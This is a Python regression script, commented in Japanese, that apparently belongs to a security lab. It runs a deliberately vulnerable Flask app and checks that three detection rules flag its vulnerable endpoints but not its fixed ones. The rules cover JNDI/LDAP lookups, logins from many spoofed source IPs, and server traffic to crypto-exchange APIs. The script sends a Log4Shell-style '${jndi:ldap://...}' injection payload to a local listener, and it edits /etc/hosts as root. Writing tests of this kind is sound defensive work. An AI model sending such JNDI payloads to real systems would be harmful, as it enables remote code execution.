#!/usr/bin/env python3
"""R29/R30/R31 の検知ロジックを、唯一の最小アプリ(vulnerable_app.py)に対して、
実際に動かして確認する。

やること:
  1. ローカルの模擬サーバーを2つ立てる(①ローグ LDAP サーバー役の素の TCP リスナー、
     ②暗号資産取引所 API 役の素の HTTP サーバー。どちらも 127.0.0.0/8 のみ)。
  2. vulnerable_app.py の各エンドポイントを、Flask のテストクライアントで呼ぶ
     (脆弱版・修正版の両方)。
  3. 実際に書き出されたイベント(events.jsonl)に対して、各 Sigma ルール
     (r29/r30/r31_*.yml)の検知ロジックを、Python に移植したミニ判定器で適用する。
  4. 「脆弱版は検知、修正版は検知されない(または、そもそも接続しない)」を確認する。

このラボ自体の脆弱性診断ではない(sqli-lab の run_regression.py と同じ位置づけ)。
"""
from __future__ import annotations

import http.server
import json
import socket
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import vulnerable_app as app_module  # noqa: E402

EVENTS_PATH = Path(__file__).with_name("events.jsonl")


# --- 模擬サーバー2つ(どちらもローカルのみ) ----------------------------------

def start_rogue_ldap_listener(host="127.0.0.7", port=13890):
    """R29 用: 本物の LDAP ではなく、接続を受け付けるだけの素の TCP リスナー。
    「JNDI ルックアップで、ここへの接続が実際に発生するか」だけを見る。"""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(5)

    def loop():
        while True:
            try:
                conn, _ = srv.accept()
                conn.close()
            except OSError:
                return

    threading.Thread(target=loop, daemon=True).start()
    return host, port


def start_mock_exchange_api(host="127.0.0.9", port=80):
    """R31 用: 本物の取引所ではなく、応答するだけの素の HTTP サーバー。
    vulnerable_app.py の /crypto_relay は(本物の取引所 API が通常 443/80 で
    応答するのに合わせて)ポート 80 固定で接続するため、ここも 80 に合わせる
    (このマシンは root で動いているため、80 を使える)。"""
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, fmt, *a):
            pass

    srv = http.server.HTTPServer((host, port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return host, port


# --- 各ルールのロジックを、Python に移植したミニ判定器 ------------------------
# (本物の Sigma/Datadog は、SIEM 側で動くので、ここでの再現はこのラボ限定の近似)

def detect_r29(events: list[dict]) -> list[dict]:
    """r29_jndi_ldap_rce_attempt.yml: java プロセスが、LDAP/RMI へ新規接続。
    本番のルールは、宛先ポートも 389/636/1099 に絞っている。このラボのローグ
    LDAP 役は、セットアップを単純にするため任意のポート(13890)で待ち受けており、
    そのポート条件までは再現していない(process_name のみで判定する、意図した
    簡略化点)。"""
    return [e for e in events if e.get("event") == "network_connection" and str(e.get("process_name", "")).endswith("java")]


def detect_r30(events: list[dict], threshold: int = 10) -> dict[str, int]:
    """r30_multi_egress_ip_proxy_rotation.yml: 同一アカウントが、短時間に
    多数の異なる送信元 IP から認証。「件数(distinct_source_ip_count)が
    閾値を超えた」アカウントを返す。"""
    by_account: dict[str, set[str]] = {}
    for e in events:
        if e.get("event") != "authentication":
            continue
        by_account.setdefault(e["account_id"], set()).add(e["src_ip"])
    return {acct: len(ips) for acct, ips in by_account.items() if len(ips) > threshold}


def detect_r31(events: list[dict]) -> list[dict]:
    """r31_server_crypto_exchange_api_egress.yml: server/production ゾーンから、
    取引所 API 相当のホストへの通信。"""
    return [
        e for e in events
        if e.get("event") == "proxy"
        and e.get("src_zone") == "server"
        and str(e.get("destination_hostname", "")).endswith(app_module.EXCHANGE_LIKE_SUFFIXES)
    ]


def main() -> int:
    EVENTS_PATH.write_text("")  # 前回分をクリア
    ldap_host, ldap_port = start_rogue_ldap_listener()
    try:
        exch_host, exch_port = start_mock_exchange_api()
    except PermissionError:
        print("エラー: ポート 80 で待ち受けできませんでした(管理者/root 権限が必要です)。", file=sys.stderr)
        return 2
    time.sleep(0.2)

    client = app_module.app.test_client()
    ok = True

    def check(label, cond):
        nonlocal ok
        print(("OK  " if cond else "NG  ") + label)
        ok = ok and cond

    # --- R29: JNDI ---------------------------------------------------------
    payload = "${jndi:ldap://%s:%d/a}" % (ldap_host, ldap_port)
    r_vuln = client.get("/jndi", query_string={"q": payload}).get_json()
    r_safe = client.get("/jndi_safe", query_string={"q": payload}).get_json()
    check("JNDI 脆弱版: 実際に接続した", r_vuln["matched"] and r_vuln["connected"])
    check("JNDI 修正版: 接続しなかった", r_safe["matched"] and not r_safe["connected"])

    # --- R30: 多数の送信元 IP からの認証 -------------------------------------
    for i in range(15):
        client.get("/login", query_string={"username": "alice", "password": "alice_pw_123"},
                   headers={"X-Forwarded-For": "203.0.113.%d" % i})
    for i in range(3):
        client.get("/login", query_string={"username": "bob", "password": "x"},
                   headers={"X-Forwarded-For": "198.51.100.%d" % i})

    # --- R31: 暗号資産取引所 API 相当への直接アクセス -------------------------
    # EXCHANGE_LIKE_SUFFIXES は ".exchange.lab" で判定するため、ホスト名で模擬する。
    # vulnerable_app 側は socket.create_connection で実際に名前解決するため、
    # gethostbyname だけの差し替えでは getaddrinfo 経由の解決まで覆えない。
    # そこで、/etc/hosts にこのラボ専用の1行だけを足して、実際に名前解決できる
    # ようにする(終了時に必ず取り除く)。
    fake_host = "api.testupbit.exchange.lab"
    hosts_line = "%s %s\n" % (exch_host, fake_host)
    with open("/etc/hosts", "a", encoding="utf-8") as f:
        f.write(hosts_line)
    try:
        r_vuln2 = client.get("/crypto_relay", query_string={"host": fake_host}).get_json()
        r_safe2 = client.get("/crypto_relay_safe", query_string={"host": fake_host}).get_json()
    finally:
        with open("/etc/hosts", encoding="utf-8") as f:
            remaining = [l for l in f if l != hosts_line]
        with open("/etc/hosts", "w", encoding="utf-8") as f:
            f.writelines(remaining)
    check("暗号資産取引所 相当 脆弱版: 実際に中継した", r_vuln2["relayed"])
    check("暗号資産取引所 相当 修正版: 中継しなかった", not r_safe2["relayed"])

    # --- イベントを読んで、ミニ判定器(R29/R30/R31)を適用 -----------------------
    events = [json.loads(l) for l in EVENTS_PATH.read_text().splitlines() if l.strip()]

    r29_hits = detect_r29(events)
    check("R29: JNDI 経由の新規接続イベントを検知した(脆弱版のみ記録されるはず)",
          len(r29_hits) == 1 and r29_hits[0]["endpoint"] == "/jndi")

    r30_hits = detect_r30(events)
    check("R30: alice(15IP)を検知、bob(3IP)は検知しない",
          "alice" in r30_hits and "bob" not in r30_hits)

    r31_hits = detect_r31(events)
    check("R31: 取引所相当への通信を検知した(脆弱版のみ記録されるはず)",
          len(r31_hits) == 1 and r31_hits[0]["endpoint"] == "/crypto_relay")

    print()
    print("全体:", "OK" if ok else "NG")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
